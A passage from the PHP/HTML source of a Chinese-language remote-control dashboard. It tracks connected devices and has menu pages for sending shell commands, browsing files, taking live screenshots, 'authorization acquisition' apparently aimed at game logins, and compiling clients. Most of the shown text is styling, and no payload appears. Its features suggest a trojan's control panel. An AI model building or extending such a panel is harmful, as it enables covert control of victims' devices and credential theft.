    foreach (glob($cmd_dir . '*.json') as $f) {
        $content = @file_get_contents($f);
        if ($content === false) continue;
        $d = json_decode($content, true);
        if ($d && isset($d['api_key']) && ($is_admin || $d['api_key'] === $api_key)) {
            $ls = strtotime($d['last_seen'] ?? 'now');
            $d['online'] = (time() - $ls) < $TIMEOUT;
            $d['offline_seconds'] = time() - $ls;
            $rf = $cmd_dir . $d['device_key'] . '_result.txt';
            $d['has_result'] = file_exists($rf);
            if ($d['has_result']) {
                $rd_content = @file_get_contents($rf);
                if ($rd_content !== false) {
                    $rd = json_decode($rd_content, true);
                    if ($rd) {
                        $d['result_time'] = $rd['time'] ?? '';
                        $d['result_exit_code'] = $rd['exit_code'] ?? '';
                    }
                }
            }
            $device_list[] = $d;
        }
    }
}

usort($device_list, function($a, $b) { 
    return $a['online'] == $b['online'] ? 0 : ($a['online'] ? -1 : 1); 
});

$online_count = count(array_filter($device_list, function($d) { return $d['online']; }));

$selected_device = isset($_GET['view']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['view']) : '';
$selected_result = null;
if ($selected_device) {
    $rf = $cmd_dir . $selected_device . '_result.txt';
    if (file_exists($rf)) {
        $content = @file_get_contents($rf);
        if ($content !== false) {
            $selected_result = json_decode($content, true);
        }
    }
}

// 创建上传目录
$upload_temp_dir = __DIR__ . '/uploads/temp/';
if (!is_dir($upload_temp_dir)) {
    mkdir($upload_temp_dir, 0755, true);
}

// 清理超过2分钟的临时文件
foreach (glob($upload_temp_dir . '*') as $old_file) {
    if (is_file($old_file) && time() - filemtime($old_file) > 120) {
        @unlink($old_file);
    }
}

while (ob_get_level()) { ob_end_clean(); }
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>泽峰远控 - 控制台</title>
    <style>        :root {
            --scale: 1;
            --sidebar-width: 260px;
            --font-size-base: 1em;
            --padding-page: 30px;
            --gap: 20px;
            --radius: 16px;
            --card-padding: 24px;
            --bg: #05080f;
            --surface: #0c1322;
            --surface-2: #101a2e;
            --border: rgba(0, 212, 255, 0.12);
            --border-glow: rgba(0, 212, 255, 0.35);
            --text: #e6f1ff;
            --text-2: #7f93b5;
            --text-3: #4a5a7a;
            --accent: #00d4ff;
            --accent-2: #7c5cff;
            --green: #00ffa3;
            --red: #ff5470;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { -webkit-text-size-adjust: 100%; text-size-adjust: 100%; }
        
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', sans-serif; 
            background-color: var(--bg);
            background-image:
                linear-gradient(rgba(0, 212, 255, 0.04) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 212, 255, 0.04) 1px, transparent 1px);
            background-size: 32px 32px;
            color: var(--text);
            min-height: 100vh; 
            min-height: 100dvh;
            display: flex; 
            font-size: var(--font-size-base);
            position: relative;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background:
                radial-gradient(600px 400px at 85% -10%, rgba(124, 92, 255, 0.12), transparent 70%),
                radial-gradient(500px 350px at 5% 110%, rgba(0, 212, 255, 0.10), transparent 70%);
            pointer-events: none;
            z-index: 0;
        }
        
        .sidebar { 
            width: var(--sidebar-width); 
            background: linear-gradient(180deg, #0a1120 0%, #131a2e 100%); 
            border-right: 1px solid var(--border);
            min-height: 100vh; 
            min-height: 100dvh;
            padding: calc(20px * var(--scale)) 0; 
            position: fixed; 
            left: 0; 
            top: 0; 
            bottom: 0; 
            display: flex; 
            flex-direction: column; 
            z-index: 100; 
            transition: transform 0.3s ease;
        }
        
        .sidebar-header { 
            padding: 0 calc(20px * var(--scale)) calc(20px * var(--scale)); 
            border-bottom: 1px solid var(--border); 
            margin-bottom: calc(20px * var(--scale)); 
        }
        
        .sidebar-logo { 
            color: #fff; 
            font-size: calc(1.4em * var(--scale)); 
            font-weight: 700; 
            text-decoration: none; 
            display: block;
            text-shadow: 0 0 14px rgba(0, 212, 255, 0.45);
        }
        
        .sidebar-sub { 
            color: var(--text-2); 
            font-size: calc(0.8em * var(--scale)); 
            display: block;
        }
        
        .user-section { 
            padding: 0 calc(20px * var(--scale)) calc(20px * var(--scale)); 
            border-bottom: 1px solid var(--border); 
            margin-bottom: calc(20px * var(--scale)); 
        }
        
        .user-avatar { 
            width: calc(50px * var(--scale)); 
            height: calc(50px * var(--scale)); 
            background: linear-gradient(135deg, var(--accent), var(--accent-2)); 
            border-radius: 50%; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            color: #05080f; 
            font-size: calc(1.5em * var(--scale)); 
            font-weight: 700; 
            margin-bottom: calc(10px * var(--scale)); 
            box-shadow: 0 0 16px rgba(0, 212, 255, 0.25);
        }
        
        .user-name { 
            color: #fff; 
            font-weight: 600; 
            font-size: calc(1em * var(--scale));
        }
        
        .user-id { 
            color: var(--text-3); 
            font-size: calc(0.7em * var(--scale)); 
            margin-top: calc(2px * var(--scale)); 
            word-break: break-all;
        }
        
        .nav-section { 
            padding: 0 calc(10px * var(--scale)); 
            flex: 1; 
            overflow-y: auto; 
        }
        
        .nav-title { 
            color: var(--text-3); 
            font-size: calc(0.7em * var(--scale)); 
            text-transform: uppercase; 
            letter-spacing: calc(1px * var(--scale)); 
            padding: 0 calc(10px * var(--scale)); 
            margin-bottom: calc(8px * var(--scale)); 
        }
        
        .nav-item { 
            display: flex; 
            align-items: center; 
            padding: calc(10px * var(--scale)) calc(15px * var(--scale)); 
            color: var(--text); 
            border-radius: calc(10px * var(--scale)); 
            margin-bottom: calc(2px * var(--scale)); 
            cursor: pointer; 
            transition: 0.2s; 
            text-decoration: none; 
            font-size: calc(0.95em * var(--scale));
            -webkit-tap-highlight-color: transparent;
            user-select: none;
            -webkit-user-select: none;
        }
        
        .nav-item:hover, .nav-item.active { 
            background: rgba(0, 212, 255, 0.08); 
            box-shadow: inset 3px 0 0 var(--accent);
        }
        
        .nav-item:active {
            background: rgba(0, 212, 255, 0.14);
        }
        
        .nav-item .icon { 
            font-size: calc(1.2em * var(--scale)); 
            margin-right: calc(10px * var(--scale)); 
            flex-shrink: 0;
        }
        
        .nav-item .badge { 
            margin-left: auto; 
            background: rgba(0, 212, 255, 0.12); 
            padding: calc(2px * var(--scale)) calc(8px * var(--scale)); 
            border-radius: calc(10px * var(--scale)); 
            font-size: calc(0.75em * var(--scale)); 
            flex-shrink: 0;
            color: var(--text-2);
        }
        
        .nav-item .badge.green { 
            background: rgba(0, 255, 163, 0.15); 
            color: var(--green);
        }
        
        .sidebar-footer { 
            padding: 0 calc(10px * var(--scale)); 
            margin-top: auto; 
        }
        
        .logout-btn { 
            display: flex; 
            align-items: center; 
            padding: calc(12px * var(--scale)) calc(15px * var(--scale)); 
            color: var(--text-2); 
            text-decoration: none; 
            border-radius: calc(10px * var(--scale)); 
            font-size: calc(0.95em * var(--scale));
            -webkit-tap-highlight-color: transparent;
        }
        
        .logout-btn:hover { 
            background: rgba(255, 84, 112, 0.1); 
            color: var(--red); 
        }
        
        .main-content { 
            flex: 1; 
            margin-left: var(--sidebar-width); 
            padding: var(--padding-page); 
            width: calc(100% - var(--sidebar-width)); 
            transition: margin-left 0.3s ease, width 0.3s ease;
            position: relative;
            z-index: 1;
        }
        
        .page { 
            display: none; 
        }
        
        .page.active { 
            display: block; 
        }
        
        .page-header { 
            margin-bottom: calc(30px * var(--scale)); 
        }
        
        .page-title { 
            font-size: calc(1.8em * var(--scale)); 
            font-weight: 700; 
            color: #fff;
            text-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
        }
        
        .page-desc { 
            color: var(--text-2); 
            font-size: calc(0.9em * var(--scale)); 
        }
        
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(calc(160px * var(--scale)), 1fr)); 
            gap: var(--gap); 
            margin-bottom: calc(30px * var(--scale)); 
        }
        
        .stat-card { 
            background: linear-gradient(180deg, var(--surface), var(--surface-2)); 
            border: 1px solid var(--border);
            border-radius: var(--radius); 
            padding: var(--card-padding); 
            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(8px);
            position: relative;
            overflow: hidden;
        }
        
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--accent), transparent);
            opacity: 0.4;
        }
        
        .stat-card .sicon { 
            font-size: calc(2em * var(--scale)); 
            margin-bottom: calc(10px * var(--scale)); 
        }
        
        .stat-card .value { 
            font-size: calc(2.2em * var(--scale)); 
            font-weight: 700; 
            color: #fff; 
        }
        
        .stat-card .label { 
            color: var(--text-2); 
            font-size: calc(0.85em * var(--scale)); 
            margin-top: calc(5px * var(--scale)); 
        }
        
        .stat-card.online .value { 
            color: var(--green); 
            text-shadow: 0 0 16px rgba(0, 255, 163, 0.4);
        }
        
        .stat-card.total .value { 
            color: var(--accent); 
            text-shadow: 0 0 16px rgba(0, 212, 255, 0.4);
        }
        
        .device-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fill, minmax(calc(240px * var(--scale)), 1fr)); 
            gap: calc(15px * var(--scale)); 
            margin-bottom: calc(30px * var(--scale)); 
        }
        
        .device-card { 
            background: linear-gradient(180deg, var(--surface), var(--surface-2)); 
            border: 1px solid var(--border);
            border-radius: calc(14px * var(--scale)); 
            padding: calc(20px * var(--scale)); 
            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.3); 
            cursor: pointer; 
            border: 2px solid transparent; 
            transition: 0.2s; 
            -webkit-tap-highlight-color: transparent;
        }
        
        .device-card:hover { 
            border-color: var(--accent); 
            transform: translateY(-2px); 
            box-shadow: 0 4px 24px rgba(0, 212, 255, 0.15);
        }
        
        .device-card:active {
            background: rgba(0, 212, 255, 0.08);
        }
        
        .device-card.selected { 
            border-color: var(--accent); 
            background: rgba(0, 212, 255, 0.08); 
        }
        
        .device-card.offline { 
            opacity: 0.55; 
        }
        
        .device-card .dheader { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            margin-bottom: calc(10px * var(--scale)); 
        }
        
        .device-card .name { 
            font-weight: 600; 
            word-break: break-all; 
            font-size: calc(0.95em * var(--scale));
            color: #fff;
        }
        
        .status-dot { 
            width: calc(10px * var(--scale)); 
            height: calc(10px * var(--scale)); 
            border-radius: 50%; 
            flex-shrink: 0; 
        }
        
        .status-dot.online { 
            background: var(--green); 
            box-shadow: 0 0 8px rgba(0, 255, 163, 0.6);
        }
        
        .status-dot.offline { 
            background: var(--red); 
        }
        
        .device-card .meta { 
            font-size: calc(0.8em * var(--scale)); 
            color: var(--text-2); 
            margin-bottom: calc(8px * var(--scale)); 
        }
        
        .badge { 
            display: inline-block; 
            font-size: calc(0.75em * var(--scale)); 
            padding: calc(4px * var(--scale)) calc(10px * var(--scale)); 
            border-radius: calc(20px * var(--scale)); 
        }
        
        .badge.success { 
            background: rgba(0, 255, 163, 0.12); 
            color: var(--green); 
        }
        
        .badge.error { 
            background: rgba(255, 84, 112, 0.12); 
            color: var(--red); 
        }
        
        .badge.wait { 
            background: rgba(127, 147, 181, 0.12); 
            color: var(--text-2); 
        }
        
        .cmd-section, .apikey-box, .result-section { 
            background: linear-gradient(180deg, var(--surface), var(--surface-2)); 
            border: 1px solid var(--border);
            border-radius: var(--radius); 
            padding: var(--card-padding); 
            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.3); 
            margin-bottom: calc(20px * var(--scale)); 
        }
        
        .cmd-section h3, .apikey-box h3, .result-section h3 { color: #fff; }
        
        .cmd-textarea { 
            width: 100%; 
            height: calc(100px * var(--scale)); 
            background: rgba(0, 212, 255, 0.04);
            border: 2px solid var(--border); 
            border-radius: calc(12px * var(--scale)); 
            padding: calc(14px * var(--scale)); 
            font-family: monospace; 
            font-size: calc(0.9em * var(--scale)); 
            color: var(--text);
            resize: vertical; 
            outline: none; 
            margin-bottom: calc(10px * var(--scale)); 
            -webkit-appearance: none;
        }
        
        .cmd-textarea::placeholder { color: var(--text-3); }
        
        .cmd-textarea:focus { 
            border-color: var(--accent); 
            box-shadow: 0 0 14px rgba(0, 212, 255, 0.2);
        }
        
        .btn { 
            padding: calc(10px * var(--scale)) calc(20px * var(--scale)); 
            background: linear-gradient(135deg, var(--accent), var(--accent-2)); 
            color: #05080f; 
            border: none; 
            border-radius: calc(8px * var(--scale)); 
            font-size: calc(0.9em * var(--scale)); 
            font-weight: 700; 
            cursor: pointer; 
            text-decoration: none; 
            display: inline-block; 
            margin: calc(3px * var(--scale)); 
            transition: 0.2s; 
            box-shadow: 0 2px 14px rgba(0, 212, 255, 0.2);
            -webkit-tap-highlight-color: transparent;
            white-space: nowrap;
        }
        
        .btn:hover { 
            opacity: 0.88; 
            transform: translateY(-1px);
        }
        
        .btn:active {
            opacity: 0.7;
            transform: scale(0.97);
        }
        
        .btn:disabled { 
            opacity: 0.4; 
            cursor: not-allowed; 
        }
        
        .btn.red { 
            background: var(--red); 
            color: #fff;
        }
        
        .btn.gray { 
            background: #2a3a5a; 
            color: var(--text);
            box-shadow: none;
        }
        
        .btn.green { 
            background: var(--green); 
            color: #05080f;
        }
        
        .apikey-display { 
            background: rgba(0, 212, 255, 0.05); 
            border: 1px dashed var(--accent); 
            padding: calc(16px * var(--scale)); 
            border-radius: calc(10px * var(--scale)); 
            font-family: monospace; 
            font-size: calc(1em * var(--scale)); 
            color: var(--accent); 
            word-break: break-all; 
            margin: calc(10px * var(--scale)) 0; 
        }
        
        .result-header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            margin-bottom: calc(15px * var(--scale));
            flex-wrap: wrap;
            gap: calc(8px * var(--scale));
        }
        
        .exit-code { 
            font-size: calc(0.8em * var(--scale)); 
            padding: calc(4px * var(--scale)) calc(12px * var(--scale)); 
            border-radius: calc(20px * var(--scale)); 
        }
        
        .exit-code.success { background: rgba(0, 255, 163, 0.12); color: var(--green); }
        .exit-code.error { background: rgba(255, 84, 112, 0.12); color: var(--red); }
        
        .result-meta { 
            font-size: calc(0.8em * var(--scale)); 
            color: var(--text-2); 
            margin-bottom: calc(12px * var(--scale)); 
            word-break: break-all;
        }
        
        pre { 
            background: #0a0f1c; 
            color: #9fd8ff; 
            border: 1px solid var(--border);
            padding: calc(16px * var(--scale)); 
            border-radius: calc(12px * var(--scale)); 
            font-family: monospace; 
            font-size: calc(0.85em * var(--scale)); 
            white-space: pre-wrap; 
            word-break: break-all; 
            max-height: calc(400px * var(--scale)); 
            overflow-y: auto; 
            -webkit-overflow-scrolling: touch;
        }
        
        .empty-state { 
            text-align: center; 
            padding: calc(60px * var(--scale)) calc(20px * var(--scale)); 
            color: var(--text-3); 
        }
        
        .empty-state .eicon { 
            font-size: calc(4em * var(--scale)); 
            margin-bottom: calc(15px * var(--scale)); 
        }
        
        .toast { 
            position: fixed; 
            top: calc(20px * var(--scale)); 
            right: calc(20px * var(--scale)); 
            padding: calc(14px * var(--scale)) calc(24px * var(--scale)); 
            border-radius: calc(12px * var(--scale)); 
            font-size: calc(0.9em * var(--scale)); 
            z-index: 1000; 
            animation: slideIn 0.3s; 
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4); 
            max-width: calc(100vw - 40px);
            word-break: break-all;
        }
        
        .toast.success { background: rgba(0, 255, 163, 0.14); color: var(--green); border: 1px solid rgba(0, 255, 163, 0.3); }
        .toast.error { background: rgba(255, 84, 112, 0.14); color: var(--red); border: 1px solid rgba(255, 84, 112, 0.3); }
        .toast.info { background: rgba(0, 212, 255, 0.14); color: var(--accent); border: 1px solid rgba(0, 212, 255, 0.3); }
        
        @keyframes slideIn { 
            from { opacity: 0; transform: translateX(20px); } 
            to { opacity: 1; transform: translateX(0); } 
        }
        
        .progress-wrap { 
            margin-top: calc(15px * var(--scale)); 
            display: none; 
        }
        
        .progress-bar-outer { 
            background: #1a2438; 
            border-radius: calc(10px * var(--scale)); 
            height: calc(8px * var(--scale)); 
            overflow: hidden; 
        }
        
        .progress-bar-inner { 
            background: linear-gradient(90deg, var(--accent), var(--accent-2)); 
            height: 100%; 
            width: 0%; 
            border-radius: calc(10px * var(--scale)); 
            transition: width 0.3s; 
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.4);
        }
        
        .progress-text { 
            text-align: center; 
            font-size: calc(0.8em * var(--scale)); 
            color: var(--text-2); 
            margin-top: calc(8px * var(--scale)); 
        }
        
        .file-breadcrumb { 
            display: flex; 
            align-items: center; 
            flex-wrap: wrap; 
            gap: calc(4px * var(--scale)); 
            margin-bottom: calc(12px * var(--scale)); 
            font-size: calc(0.85em * var(--scale)); 
        }
        
        .file-breadcrumb a { 
            color: var(--accent); 
            text-decoration: none; 
            cursor: pointer; 
            -webkit-tap-highlight-color: transparent;
        }
        
        .file-breadcrumb a:hover { 
            text-decoration: underline; 
        }
        
        .file-breadcrumb span { 
            color: var(--text-3); 
        }
        
        .file-path-input { 
            flex: 1; 
            min-width: calc(150px * var(--scale)); 
            padding: calc(8px * var(--scale)) calc(12px * var(--scale)); 
            background: rgba(0, 212, 255, 0.04);
            border: 2px solid var(--border); 
            border-radius: calc(8px * var(--scale)); 
            font-size: calc(0.85em * var(--scale)); 
            color: var(--text);
            outline: none; 
            -webkit-appearance: none;
        }
        
        .file-path-input::placeholder { color: var(--text-3); }
        
        .file-path-input:focus { 
            border-color: var(--accent); 
            box-shadow: 0 0 12px rgba(0, 212, 255, 0.2);
        }
        
        .file-list { 
            background: var(--surface); 
            border: 1px solid var(--border);
            border-radius: calc(14px * var(--scale)); 
            overflow: hidden; 
            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.3); 
        }
        
        .file-item { 
            display: flex; 
            align-items: center; 
            padding: calc(12px * var(--scale)) calc(16px * var(--scale)); 
            border-bottom: 1px solid rgba(0, 212, 255, 0.08); 
            cursor: pointer; 
            transition: 0.15s; 
            -webkit-tap-highlight-color: transparent;
            flex-wrap: wrap;
            gap: calc(8px * var(--scale));
        }
        
        .file-item:hover { 
            background: rgba(0, 212, 255, 0.06); 
        }
        
        .file-item:active {
            background: rgba(0, 212, 255, 0.1);
        }
        
        .file-item:last-child { 
            border-bottom: none; 
        }
        
        .file-item .ficon { 
            font-size: calc(1.5em * var(--scale)); 
            margin-right: calc(12px * var(--scale)); 
            width: calc(30px * var(--scale)); 
            text-align: center; 
            flex-shrink: 0; 
        }
        
        .file-item .finfo { 
            flex: 1; 
            min-width: 0; 
        }
        
        .file-item .fname { 
            font-size: calc(0.9em * var(--scale)); 
            color: #fff; 
            white-space: nowrap; 
            overflow: hidden; 
            text-overflow: ellipsis; 
        }
        
        .file-item .fmeta { 
            font-size: calc(0.72em * var(--scale)); 
            color: var(--text-3); 
            margin-top: calc(2px * var(--scale)); 
        }
        
        .file-item .fsize { 
            font-size: calc(0.8em * var(--scale)); 
            color: var(--text-2); 
            margin-right: calc(16px * var(--scale)); 
            white-space: nowrap; 
        }
        
        .file-item .fdate { 
            font-size: calc(0.75em * var(--scale)); 
            color: var(--text-3); 
            white-space: nowrap; 
        }
        
        .file-item.selected { 
            background: rgba(0, 212, 255, 0.1); 
        }
        
        .file-loading { 
            text-align: center; 
            padding: calc(40px * var(--scale)); 
            color: var(--text-3); 
        }
        
        .file-toolbar { 
            display: flex; 
            gap: calc(8px * var(--scale)); 
            margin-bottom: calc(12px * var(--scale)); 
            flex-wrap: wrap; 
        }
        
        .file-toolbar select { 
            padding: calc(8px * var(--scale)) calc(12px * var(--scale)); 
            background: #0c1322;
            border: 2px solid var(--border); 
            border-radius: calc(8px * var(--scale)); 
            font-size: calc(0.85em * var(--scale)); 
            color: var(--text);
            outline: none; 
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%2300d4ff' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right calc(10px * var(--scale)) center;
            padding-right: calc(30px * var(--scale));
        }
        
        .file-toolbar select option { background: #0c1322; color: var(--text); }
        
        .build-buttons { 
            display: flex; 
            gap: calc(10px * var(--scale)); 
            flex-wrap: wrap; 
            align-items: center; 
        }
        
        .device-select-row { 
            display: flex; 
            gap: calc(10px * var(--scale)); 
            align-items: center; 
            margin-bottom: calc(15px * var(--scale)); 
            flex-wrap: wrap; 
        }
        
        .device-select-row select { 
            padding: calc(8px * var(--scale)) calc(12px * var(--scale)); 
            background: #0c1322;
            border: 2px solid var(--border); 
            border-radius: calc(8px * var(--scale)); 
            font-size: calc(0.85em * var(--scale)); 
            color: var(--text);
            outline: none; 
            min-width: calc(200px * var(--scale)); 
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%2300d4ff' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right calc(10px * var(--scale)) center;
            padding-right: calc(30px * var(--scale));
        }
        
        .device-select-row select option { background: #0c1322; color: var(--text); }
        
        .device-select-row span { 
            font-size: calc(0.85em * var(--scale)); 
            color: var(--text-2); 
        }
        
        .alert { 
            padding: calc(12px * var(--scale)) calc(16px * var(--scale)); 
            border-radius: calc(10px * var(--scale)); 
            margin-bottom: calc(15px * var(--scale)); 
            font-size: calc(0.9em * var(--scale)); 
        }
        
        .alert.success { background: rgba(0, 255, 163, 0.1); color: var(--green); border: 1px solid rgba(0, 255, 163, 0.3); }
        .alert.error { background: rgba(255, 84, 112, 0.1); color: var(--red); border: 1px solid rgba(255, 84, 112, 0.3); }
        
        .admin-table-wrap {
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            margin: 0 calc(-16px * var(--scale));
            padding: 0 calc(16px * var(--scale));
        }
        
        .admin-table { 
            width: 100%; 
            border-collapse: collapse; 
            margin-top: calc(15px * var(--scale)); 
            font-size: calc(0.85em * var(--scale));
            min-width: calc(600px * var(--scale));
        }
        
        .admin-table th { 
            padding: calc(12px * var(--scale)); 
            border-bottom: 2px solid var(--border); 
            text-align: left; 
            background: rgba(0, 212, 255, 0.06); 
            color: var(--text-2);
            white-space: nowrap;
        }
        
        .admin-table td { 
            padding: calc(10px * var(--scale)); 
            border-bottom: 1px solid rgba(0, 212, 255, 0.08); 
            color: var(--text);
        }
        
        .admin-table tr:hover { 
            background: rgba(0, 212, 255, 0.04); 
        }
        
        .sidebar-toggle {
            display: none;
            position: fixed;
            top: calc(12px * var(--scale));
            left: calc(12px * var(--scale));
            z-index: 200;
            width: calc(40px * var(--scale));
            height: calc(40px * var(--scale));
            border-radius: 50%;
            background: linear-gradient(135deg, var(--accent), var(--accent-2));
            color: #05080f;
            border: none;
            font-size: calc(1.2em * var(--scale));
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 2px 12px rgba(0, 212, 255, 0.3);
            -webkit-tap-highlight-color: transparent;
            align-items: center;
            justify-content: center;
        }
        
        .sidebar-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.6);
            z-index: 99;
        }
        
        .sidebar-overlay.active {
            display: block;
        }
        
        /* 上传提示弹窗 */
        .upload-modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(180deg, #0c1322, #101a2e);
            border: 1px solid var(--border);
            border-radius: calc(14px * var(--scale));
            padding: calc(24px * var(--scale));
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
            z-index: 1001;
            max-width: 90vw;
            width: 400px;
            text-align: center;
            color: var(--text);
        }
        
        .upload-modal h3 {
            margin-bottom: calc(12px * var(--scale));
            font-size: calc(1.1em * var(--scale));
            color: #fff;
        }
        
        .upload-modal p {
            color: var(--text-2);
            margin-bottom: calc(20px * var(--scale));
            font-size: calc(0.9em * var(--scale));
            word-break: break-all;
        }
        
        .upload-modal .modal-buttons {
            display: flex;
            gap: calc(10px * var(--scale));
            justify-content: center;
        }
        
        .upload-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1000;
        }
        
        .countdown-bar {
            background: #1a2438;
            height: calc(6px * var(--scale));
            border-radius: calc(3px * var(--scale));
            margin-top: calc(10px * var(--scale));
            overflow: hidden;
        }
        
        .countdown-bar-inner {
            background: var(--green);
            height: 100%;
            width: 100%;
            border-radius: calc(3px * var(--scale));
            transition: width 1s linear;
            box-shadow: 0 0 8px rgba(0, 255, 163, 0.4);
        }
        
        @media (max-width: 768px) {
            :root {
                --scale: 0.82;
                --sidebar-width: 260px;
                --padding-page: 16px;
                --gap: 12px;
                --radius: 12px;
                --card-padding: 16px;
            }
            
            .sidebar { transform: translateX(-100%); width: 260px; box-shadow: 2px 0 20px rgba(0,0,0,0.3); }
            .sidebar.open { transform: translateX(0); }
            .sidebar-toggle { display: flex; }
            .main-content { margin-left: 0 !important; width: 100% !important; padding-top: calc(60px * var(--scale)); }
            .stats-grid { grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); }
            .device-grid { grid-template-columns: 1fr; }
            .device-select-row select { min-width: 100%; width: 100%; }
            .file-toolbar { flex-direction: column; }
            .file-toolbar select, .file-toolbar .file-path-input { width: 100%; }
            .build-buttons { flex-direction: column; align-items: stretch; }
            .build-buttons .btn { text-align: center; }
            .upload-modal { width: 95vw; }
            
            .cmd-textarea, .file-path-input, .file-toolbar select, .device-select-row select {
                font-size: 16px;
                -webkit-appearance: none;
                appearance: none;
            }
        }
        
        @media (max-width: 375px) {
            :root {
                --scale: 0.75;
                --padding-page: 12px;
                --gap: 10px;
                --radius: 10px;
                --card-padding: 14px;
            }
        }

    </style>
</head>
<body>

<button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()" aria-label="菜单">☰</button>
<div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>

<div class="sidebar" id="sidebar">
    <div class="sidebar-header"><a href="index.php" class="sidebar-logo">泽峰远控</a><span class="sidebar-sub">值得信赖的远控</span></div>
    <div class="user-section"><div class="user-avatar"><?=strtoupper(substr($username,0,1))?></div><div class="user-name"><?=htmlspecialchars($username)?><?php if($is_admin):?> 👑<?php endif;?></div><div class="user-id"><?=htmlspecialchars(substr($api_key,0,16))?>...</div></div>
    <div class="nav-section">
        <div class="nav-title">控制台</div>
        <div class="nav-item active" onclick="navTo('status')"><span class="icon">📊</span><span>运行状态</span><span class="badge green"><?=$online_count?></span></div>
        <div class="nav-item" onclick="navTo('devices')"><span class="icon">📱</span><span>设备管理</span><span class="badge"><?=count($device_list)?></span></div>
        <div class="nav-item" onclick="navTo('commands')"><span class="icon">💻</span><span>命令发送</span></div>
        <div class="nav-item" onclick="navTo('files')"><span class="icon">📁</span><span>文件管理</span></div>
        <div class="nav-item" onclick="navTo('screenshot')"><span class="icon">📸</span><span>实时截屏</span></div>
        <div class="nav-item" onclick="navTo('ipquery')"><span class="icon">🌐</span><span>IP查询</span></div>

        <div class="nav-item" onclick="navTo('gameauth')"><span class="icon">🎮</span><span>授权获取</span></div>
        <div class="nav-item" onclick="navTo('apikey')"><span class="icon">🔑</span><span>密钥与编译</span></div>
        <?php if($is_admin):?>
        <div class="nav-item" onclick="navTo('admin')"><span class="icon">👑</span><span>用户管理</span><span class="badge"><?=count($all_users)?></span></div>
        <?php endif;?>
    </div>
    <div class="sidebar-footer"><a href="logout.php" class="logout-btn">🚪 退出登录</a></div>
</div>

<div class="main-content">
    <?php if($message):?><div class="alert success"><?=htmlspecialchars($message)?></div><?php endif;?>
    
    <div id="page-status" class="page active">
        <div class="page-header"><h1 class="page-title">📊 运行状态</h1></div>
        <div class="stats-grid">
            <div class="stat-card online"><div class="sicon">🟢</div><div class="value"><?=$online_count?></div><div class="label">当前在线</div></div>
            <div class="stat-card total"><div class="sicon">📱</div><div class="value"><?=count($device_list)?></div><div class="label">总设备数</div></div>
            <div class="stat-card"><div class="sicon">⏱️</div><div class="value"><?=$TIMEOUT/60?>分钟</div><div class="label">离线清理</div></div>
        </div>
        <?php if(empty($device_list)):?><div class="empty-state"><div class="eicon">📭</div><p>暂无设备</p></div><?php else:?><h3>在线设备</h3><div class="device-grid"><?php foreach($device_list as $d):if($d['online']):?><div class="device-card"><div class="dheader"><span class="name"><?=htmlspecialchars($d['device_key'])?></span><span class="status-dot online"></span></div><div class="meta"><?=htmlspecialchars($d['last_seen'])?></div></div><?php endif;endforeach;?></div><?php endif;?>
    </div>

    <div id="page-devices" class="page"><div class="page-header"><h1 class="page-title">📱 设备管理</h1></div><div class="device-grid"><?php foreach($device_list as $d):?><div class="device-card <?=$d['online']?'':'offline'?>" onclick="selectDevice('<?=htmlspecialchars($d['device_key'])?>')"><div class="dheader"><span class="name"><?=htmlspecialchars($d['device_key'])?></span><span class="status-dot <?=$d['online']?'online':'offline'?>"></span></div><div class="meta"><?=$d['online']?'🟢 在线':'🔴 离线 '.floor($d['offline_seconds']/60).'分钟'?></div></div><?php endforeach;?></div></div>

    <div id="page-commands" class="page">
        <div class="page-header"><h1 class="page-title">💻 命令发送</h1><p class="page-desc">向设备发送Shell命令</p></div>
        <div class="cmd-section">
            <div class="device-select-row">
                <select id="cmdDevice" onchange="onCmdDeviceChange()"><option value="">选择设备</option><?php foreach($device_list as $d):if($d['online']):?><option value="<?=htmlspecialchars($d['device_key'])?>" <?=$selected_device==$d['device_key']?'selected':''?>><?=htmlspecialchars($d['device_key'])?></option><?php endif;endforeach;?></select>
